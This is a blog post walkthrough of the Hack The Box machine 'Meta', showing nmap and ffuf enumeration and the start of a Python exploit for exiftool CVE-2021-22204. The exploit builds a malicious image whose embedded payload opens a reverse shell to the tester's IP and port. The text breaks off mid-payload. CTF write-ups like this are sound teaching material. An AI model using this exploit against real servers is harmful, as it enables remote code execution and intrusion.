<!DOCTYPE html>









<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en"
  
    data-mode="dark"
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  

    

    

  

  

  
    
    
    

    
      <!-- it's a local file path -->

    
  

  
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="Hack The Box - Meta" />
<meta property="og:locale" content="en" />
<meta name="description" content="Meta is a medium rated machine on HackTheBox created by Nauten. For the user part we will abuse a CVE in exiftool to obtain a reverse shell on the machine. This will be followed up by another CVE inside ImageMagick which will give us a shell as another user. To escalate to root we will modify a config file for neofetch which we are able to run using sudo." />
<meta property="og:description" content="Meta is a medium rated machine on HackTheBox created by Nauten. For the user part we will abuse a CVE in exiftool to obtain a reverse shell on the machine. This will be followed up by another CVE inside ImageMagick which will give us a shell as another user. To escalate to root we will modify a config file for neofetch which we are able to run using sudo." />
<link rel="canonical" href="http://localhost:4000/posts/meta/" />
<meta property="og:url" content="http://localhost:4000/posts/meta/" />
<meta property="og:site_name" content="Ankit Kanojiya" />
<meta property="og:image" content="http://localhost:4000/img/meta/000_info_card.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-06-11T00:00:00+08:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="http://localhost:4000/img/meta/000_info_card.png" />
<meta property="twitter:title" content="Hack The Box - Meta" />
<meta name="twitter:site" content="@AnkitKanojiya69" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-06-11T00:00:00+08:00","datePublished":"2022-06-11T00:00:00+08:00","description":"Meta is a medium rated machine on HackTheBox created by Nauten. For the user part we will abuse a CVE in exiftool to obtain a reverse shell on the machine. This will be followed up by another CVE inside ImageMagick which will give us a shell as another user. To escalate to root we will modify a config file for neofetch which we are able to run using sudo.","headline":"Hack The Box - Meta","image":"http://localhost:4000/img/meta/000_info_card.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/meta/"},"url":"http://localhost:4000/posts/meta/"}</script>
<!-- End Jekyll SEO tag -->

  

  <title>Hack The Box - Meta | Ankit Kanojiya
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="Ankit Kanojiya">
<meta name="application-name" content="Ankit Kanojiya">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  

    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/style.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>

  
</head>


  <body data-spy="scroll" data-target="#toc" data-topbar-visible="true">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end">
  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" class="mx-auto">
        
          
          <img src="/assets/img/avtar.jpg" alt="avatar" onerror="this.style.display='none'">
        
      </a>
    </div>

    <div class="site-title">
      <a href="/">Ankit Kanojiya</a>
    </div>
    <div class="site-subtitle font-italic">ğ„ğ­ğ¡ğ¢ğœğšğ¥ ğ‡ğšğœğ¤ğğ« || ğ’ğ¨ğŸğ­ğ°ğšğ«ğ ğ„ğ§ğ ğ¢ğ§ğğğ« || ğ‚ğ²ğ›ğğ« ğ’ğğœğ®ğ«ğ¢ğ­ğ² ğ‘ğğ¬ğšğ«ğœğ¡ğğ«.!! ğğ’ğ‚ğ & ğğ’ğ„ğ.</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">

    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>TAGS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ABOUT</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center">

    

    
      

      
      <a href="https://github.com/ankit0183" aria-label="github"
        target="_blank" rel="noopener">
        <i class="fab fa-github"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/AnkitKanojiya69" aria-label="twitter"
        target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="
          javascript:location.href = 'mailto:' + ['ankitkanojiya','yandex.ru'].join('@')" aria-label="email"
        >
        <i class="fas fa-envelope"></i>
      </a>
      

    
      

      
      <a href="/feed.xml" aria-label="rss"
        >
        <i class="fas fa-rss"></i>
      </a>
      

    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper">
  <div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4">
    <span id="breadcrumb">

    

    

      

        
          <span>
            <a href="/">
              Home
            </a>
          </span>

        

      

        

      

        

          
            <span>Hack The Box - Meta</span>
          

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div id="main" class="container pl-xl-4 pr-xl-4">
        





<div class="row">

  <!-- core -->
  <div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4">
    <div class="post pl-1 pr-1 pl-md-2 pr-md-2">

    

    
      
      
        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->


<!-- images -->




  
  

  
    
      
      
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    
      
      
        

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  

  



<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    

    

  

  
  

  

  
  

  

  
  

  




<!-- Wrap prompt element of blockquote with the <div> tag -->







<!-- return -->

<h1 data-toc-skip>Hack The Box - Meta</h1>

<div class="post-meta text-muted">
    <!-- published date -->
    <span>
      Posted
      <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class=""
    data-ts="1654876800"
    data-df="ll"
    data-toggle="tooltip" data-placement="bottom">
  Jun 11, 2022
</em>

    </span>

    <!-- lastmod date -->
    

  
    

    <div class="mt-3 mb-3">
      <img data-src="/img/meta/000_info_card.png" class="preview-img bg"
        alt="Preview Image"

      

       data-proofer-ignore>

      

    </div>
  

  <div class="d-flex justify-content-between">
    <!-- author(s) -->
    <span>
      

      By

      <em>
      
        <a href="https://twitter.com/AnkitKanojiya69">Ankit Kanojiya</a>
      
      </em>
    </span>

    <div>
      <!-- page views -->
      

      <!-- read time -->
      <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->



<!-- words per minute  -->










<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom"
  title="1905 words">
  <em>10 min</em> read</span>

    </div>

  </div> <!-- .d-flex -->

</div> <!-- .post-meta -->

<div class="post-content">
  <p>Meta is a medium rated machine on HackTheBox created by <a href="https://www.hackthebox.com/home/users/profile/27582">Nauten</a>. For the user part we will abuse a CVE in exiftool to obtain a reverse shell on the machine. This will be followed up by another CVE inside ImageMagick which will give us a shell as another user. To escalate to root we will modify a config file for neofetch which we are able to run using sudo.</p>

<h1 id="user">User</h1>
<p>As usual we start our enumeration with a nmap scan against all ports followed by a script and version detection scan against the open ones to get an initial overview of the attack surface.</p>

<h2 id="nmap"><span class="mr-2">Nmap</span><a href="#nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<p><code class="language-plaintext highlighter-rouge">All ports</code></p>
<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="err">$</span> <span class="n">sudo</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="no">T4</span> <span class="mf">10.129.166.252</span>
<span class="nc">Starting</span> <span class="nc">Nmap</span> <span class="mf">7.92</span> <span class="p">(</span> <span class="n">https</span><span class="o">://</span><span class="n">nmap</span><span class="mf">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2022</span><span class="o">-</span><span class="mo">01</span><span class="o">-</span><span class="mi">22</span> <span class="mi">22</span><span class="o">:</span><span class="mi">40</span> <span class="no">CET</span>
<span class="nc">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.129.166.252</span>
<span class="nc">Host</span> <span class="n">is</span> <span class="nf">up</span> <span class="p">(</span><span class="mf">0.027</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="mf">.</span>
<span class="nc">Not</span> <span class="n">shown</span><span class="o">:</span> <span class="mi">65532</span> <span class="n">closed</span> <span class="n">tcp</span> <span class="nf">ports</span> <span class="p">(</span><span class="n">reset</span><span class="p">)</span>
<span class="no">PORT</span>      <span class="no">STATE</span>    <span class="no">SERVICE</span>
<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span>    <span class="n">open</span>     <span class="n">ssh</span>
<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span>    <span class="n">open</span>     <span class="n">http</span>

<span class="nc">Nmap</span> <span class="n">done</span><span class="o">:</span> <span class="mi">1</span> <span class="no">IP</span> <span class="nf">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="n">in</span> <span class="mf">529.64</span> <span class="n">seconds</span>
</pre></td></tr></tbody></table></code></div></div>

<p><code class="language-plaintext highlighter-rouge">Script and version</code></p>
<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre><span class="err">$</span> <span class="n">sudo</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sC</span> <span class="o">-</span><span class="n">sV</span> <span class="o">-</span><span class="n">p22</span><span class="p">,</span><span class="mi">80</span> <span class="o">-</span><span class="n">n</span> <span class="mf">10.129.166.252</span>
<span class="nc">Starting</span> <span class="nc">Nmap</span> <span class="mf">7.92</span> <span class="p">(</span> <span class="n">https</span><span class="o">://</span><span class="n">nmap</span><span class="mf">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2022</span><span class="o">-</span><span class="mo">01</span><span class="o">-</span><span class="mi">22</span> <span class="mi">22</span><span class="o">:</span><span class="mi">52</span> <span class="no">CET</span>
<span class="nc">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.129.166.252</span>
<span class="nc">Host</span> <span class="n">is</span> <span class="nf">up</span> <span class="p">(</span><span class="mf">0.029</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="mf">.</span>

<span class="no">PORT</span>   <span class="no">STATE</span> <span class="no">SERVICE</span> <span class="no">VERSION</span>
<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="n">open</span>  <span class="n">ssh</span>     <span class="nc">OpenSSH</span> <span class="mf">7.9</span><span class="n">p1</span> <span class="nc">Debian</span> <span class="mi">10</span><span class="o">+</span><span class="nf">deb10u2</span> <span class="p">(</span><span class="n">protocol</span> <span class="mf">2.0</span><span class="p">)</span>
<span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span><span class="o">:</span>
<span class="o">|</span>   <span class="mi">2048</span> <span class="mi">12</span><span class="o">:</span><span class="mi">81</span><span class="o">:</span><span class="mi">17</span><span class="o">:</span><span class="mi">5</span><span class="n">a</span><span class="o">:</span><span class="mi">5</span><span class="n">a</span><span class="o">:</span><span class="n">c9</span><span class="o">:</span><span class="n">c6</span><span class="o">:</span><span class="mo">00</span><span class="o">:</span><span class="n">db</span><span class="o">:</span><span class="n">f0</span><span class="o">:</span><span class="n">ed</span><span class="o">:</span><span class="mi">93</span><span class="o">:</span><span class="mi">64</span><span class="o">:</span><span class="n">fd</span><span class="o">:</span><span class="mi">1</span><span class="n">e</span><span class="o">:</span><span class="mi">08</span> <span class="p">(</span><span class="no">RSA</span><span class="p">)</span>
<span class="o">|</span>   <span class="mi">256</span> <span class="n">b5</span><span class="o">:</span><span class="n">e5</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">53</span><span class="o">:</span><span class="mo">00</span><span class="o">:</span><span class="mi">18</span><span class="o">:</span><span class="mi">96</span><span class="o">:</span><span class="n">a6</span><span class="o">:</span><span class="n">f8</span><span class="o">:</span><span class="mi">42</span><span class="o">:</span><span class="n">d8</span><span class="o">:</span><span class="n">c7</span><span class="o">:</span><span class="n">fb</span><span class="o">:</span><span class="mi">13</span><span class="o">:</span><span class="mi">20</span><span class="o">:</span><span class="mi">49</span> <span class="p">(</span><span class="no">ECDSA</span><span class="p">)</span>
<span class="o">|</span><span class="n">_</span>  <span class="mi">256</span> <span class="mo">05</span><span class="o">:</span><span class="n">e9</span><span class="o">:</span><span class="n">df</span><span class="o">:</span><span class="mi">71</span><span class="o">:</span><span class="n">b5</span><span class="o">:</span><span class="mi">9</span><span class="n">f</span><span class="o">:</span><span class="mi">25</span><span class="o">:</span><span class="mo">03</span><span class="o">:</span><span class="mi">6</span><span class="n">b</span><span class="o">:</span><span class="n">d0</span><span class="o">:</span><span class="mi">46</span><span class="o">:</span><span class="mi">8</span><span class="n">d</span><span class="o">:</span><span class="mo">05</span><span class="o">:</span><span class="mi">45</span><span class="o">:</span><span class="mi">44</span><span class="o">:</span><span class="mi">20</span> <span class="p">(</span><span class="no">ED25519</span><span class="p">)</span>
<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="n">open</span>  <span class="n">http</span>    <span class="nc">Apache</span> <span class="n">httpd</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="o">:</span> <span class="nc">Apache</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="o">:</span> <span class="nc">Did</span> <span class="n">not</span> <span class="n">follow</span> <span class="n">redirect</span> <span class="n">to</span> <span class="n">http</span><span class="o">://</span><span class="n">artcorp</span><span class="mf">.</span><span class="n">htb</span>
<span class="nc">Service</span> <span class="nc">Info</span><span class="o">:</span> <span class="no">OS</span><span class="o">:</span> <span class="nc">Linux</span><span class="p">;</span> <span class="no">CPE</span><span class="o">:</span> <span class="n">cpe</span><span class="o">:/</span><span class="n">o</span><span class="o">:</span><span class="n">linux</span><span class="o">:</span><span class="n">linux_kernel</span>

<span class="nc">Service</span> <span class="n">detection</span> <span class="n">performed</span><span class="mf">.</span> <span class="nc">Please</span> <span class="n">report</span> <span class="n">any</span> <span class="n">incorrect</span> <span class="n">results</span> <span class="n">at</span> <span class="n">https</span><span class="o">://</span><span class="n">nmap</span><span class="mf">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span> <span class="mf">.</span>
<span class="nc">Nmap</span> <span class="n">done</span><span class="o">:</span> <span class="mi">1</span> <span class="no">IP</span> <span class="nf">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="n">in</span> <span class="mf">9.73</span> <span class="n">seconds</span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="exfitool"><span class="mr-2">Exfitool</span><a href="#exfitool" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>The nmap scan leaks the hostname <code class="language-plaintext highlighter-rouge">artcorp.htb</code> so we add it to our <code class="language-plaintext highlighter-rouge">/etc/hosts</code>. Opening the page up in our browser it looks like a completly static webpage without much functionality.</p>

<p><a href="/img/meta/005_artcorp_home.png"><img data-src="/img/meta/005_artcorp_home.png" alt="005_artcorp_home" data-proofer-ignore></a></p>

<p>Checking for additional vhosts using ffuf we are able to find <code class="language-plaintext highlighter-rouge">dev01.artcorp.htb</code> which we also add to our <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre></td><td class="rouge-code"><pre><span class="err">$</span> <span class="n">ffuf</span> <span class="o">-</span><span class="n">w</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="nc">Discovery</span><span class="o">/</span><span class="no">DNS</span><span class="o">/</span><span class="n">subdomains</span><span class="o">-</span><span class="n">top1million</span><span class="o">-</span><span class="mf">110000.</span><span class="n">txt</span> <span class="o">-</span><span class="nc">H</span> <span class="s1">'Host: FUZZ.artcorp.htb'</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="o">://</span><span class="mf">10.129.166.252</span> <span class="o">-</span><span class="n">fs</span> <span class="mi">0</span>

        <span class="o">/</span><span class="s1">'___\  /'</span><span class="n">___</span><span class="err">\</span>           <span class="o">/</span><span class="err">'</span><span class="n">___</span><span class="err">\</span>
       <span class="o">/</span><span class="err">\</span> <span class="err">\</span><span class="n">__</span><span class="o">/</span> <span class="o">/</span><span class="err">\</span> <span class="err">\</span><span class="n">__</span><span class="o">/</span>  <span class="n">__</span>  <span class="n">__</span>  <span class="o">/</span><span class="err">\</span> <span class="err">\</span><span class="n">__</span><span class="o">/</span>
       <span class="err">\</span> <span class="err">\</span> <span class="p">,</span><span class="n">__</span><span class="err">\\</span> <span class="err">\</span> <span class="p">,</span><span class="n">__</span><span class="err">\</span><span class="o">/</span><span class="err">\</span> <span class="err">\</span><span class="o">/</span><span class="err">\</span> <span class="err">\</span> <span class="err">\</span> <span class="err">\</span> <span class="p">,</span><span class="n">__</span><span class="err">\</span>
        <span class="err">\</span> <span class="err">\</span> <span class="err">\</span><span class="n">_</span><span class="o">/</span> <span class="err">\</span> <span class="err">\</span> <span class="err">\</span><span class="n">_</span><span class="o">/</span><span class="err">\</span> <span class="err">\</span> <span class="err">\</span><span class="n">_</span><span class="err">\</span> <span class="err">\</span> <span class="err">\</span> <span class="err">\</span> <span class="err">\</span><span class="n">_</span><span class="o">/</span>
         <span class="err">\</span> <span class="err">\</span><span class="n">_</span><span class="err">\</span>   <span class="err">\</span> <span class="err">\</span><span class="n">_</span><span class="err">\</span>  <span class="err">\</span> <span class="err">\</span><span class="nb">____</span><span class="o">/</span>  <span class="err">\</span> <span class="err">\</span><span class="n">_</span><span class="err">\</span>
          <span class="err">\</span><span class="o">/</span><span class="n">_</span><span class="o">/</span>    <span class="err">\</span><span class="o">/</span><span class="n">_</span><span class="o">/</span>   <span class="err">\</span><span class="o">/</span><span class="n">___</span><span class="o">/</span>    <span class="err">\</span><span class="o">/</span><span class="n">_</span><span class="o">/</span>

       <span class="n">v1</span><span class="mf">.3.1</span> <span class="nc">Kali</span> <span class="nc">Exclusive</span> <span class="o">&lt;</span><span class="mi">3</span>
<span class="nb">________________________________________________</span>

 <span class="o">::</span> <span class="nc">Method</span>           <span class="o">:</span> <span class="no">GET</span>
 <span class="o">::</span> <span class="no">URL</span>              <span class="o">:</span> <span class="n">http</span><span class="o">://</span><span class="mf">10.129.166.252</span>
 <span class="o">::</span> <span class="nc">Wordlist</span>         <span class="o">:</span> <span class="no">FUZZ</span><span class="o">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="nc">Discovery</span><span class="o">/</span><span class="no">DNS</span><span class="o">/</span><span class="n">subdomains</span><span class="o">-</span><span class="n">top1million</span><span class="o">-</span><span class="mf">110000.</span><span class="n">txt</span>
 <span class="o">::</span> <span class="nc">Header</span>           <span class="o">:</span> <span class="nc">Host</span><span class="o">:</span> <span class="no">FUZZ</span><span class="mf">.</span><span class="n">artcorp</span><span class="mf">.</span><span class="n">htb</span>
 <span class="o">::</span> <span class="nc">Follow</span> <span class="n">redirects</span> <span class="o">:</span> <span class="kc">false</span>
 <span class="o">::</span> <span class="nc">Calibration</span>      <span class="o">:</span> <span class="kc">false</span>
 <span class="o">::</span> <span class="nc">Timeout</span>          <span class="o">:</span> <span class="mi">10</span>
 <span class="o">::</span> <span class="nc">Threads</span>          <span class="o">:</span> <span class="mi">40</span>
 <span class="o">::</span> <span class="nc">Matcher</span>          <span class="o">:</span> <span class="nc">Response</span> <span class="n">status</span><span class="o">:</span> <span class="mi">200</span><span class="p">,</span><span class="mi">204</span><span class="p">,</span><span class="mi">301</span><span class="p">,</span><span class="mi">302</span><span class="p">,</span><span class="mi">307</span><span class="p">,</span><span class="mi">401</span><span class="p">,</span><span class="mi">403</span><span class="p">,</span><span class="mi">405</span>
 <span class="o">::</span> <span class="nc">Filter</span>           <span class="o">:</span> <span class="nc">Response</span> <span class="n">size</span><span class="o">:</span> <span class="mi">0</span>
<span class="nb">________________________________________________</span>

<span class="n">dev01</span>                   <span class="p">[</span><span class="nc">Status</span><span class="o">:</span> <span class="mi">200</span><span class="p">,</span> <span class="nc">Size</span><span class="o">:</span> <span class="mi">247</span><span class="p">,</span> <span class="nc">Words</span><span class="o">:</span> <span class="mi">16</span><span class="p">,</span> <span class="nc">Lines</span><span class="o">:</span> <span class="mi">10</span><span class="p">]</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Going there we see a development page with only one application available.</p>

<p><a href="/img/meta/010_dev_home.png"><img data-src="/img/meta/010_dev_home.png" alt="010_dev_home" data-proofer-ignore></a></p>

<p>Clicking on <code class="language-plaintext highlighter-rouge">MetaView</code> there is a file upload form which tells us to upload an image to display metadata.</p>

<p><a href="/img/meta/015_dev_upload.png"><img data-src="/img/meta/015_dev_upload.png" alt="015_dev_upload" data-proofer-ignore></a></p>

<p>Uploading a test <code class="language-plaintext highlighter-rouge">jpg</code> the output looks like straight from exiftool.</p>

<p><a href="/img/meta/020_exiftool_out.png"><img data-src="/img/meta/020_exiftool_out.png" alt="020_exiftool_out" data-proofer-ignore></a></p>

<p>There has been a recent CVE(CVE-2021-22204)with remote code execution in exiftool. Using this <a href="https://github.com/convisolabs/CVE-2021-22204-exiftool">PoC</a> where we only have to adjust our ip address to tun0 and the port to where we want to catch the reverse shell we can generate an image that sends a python reverse shell back to our machine.</p>

<p><code class="language-plaintext highlighter-rouge">exploit.py</code></p>
<div class="language-py highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre></td><td class="rouge-code"><pre><span class="c1">#!/bin/env python3
</span>
<span class="kn">import</span> <span class="n">base64</span>
<span class="kn">import</span> <span class="n">subprocess</span>

<span class="n">ip</span> <span class="o">=</span> <span class="s">'10.10.14.73'</span>
<span class="n">port</span> <span class="o">=</span> <span class="s">'7575'</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"(metadata </span><span class="se">\"</span><span class="s">\c${use MIME::Base64;eval(decode_base64('"</span>


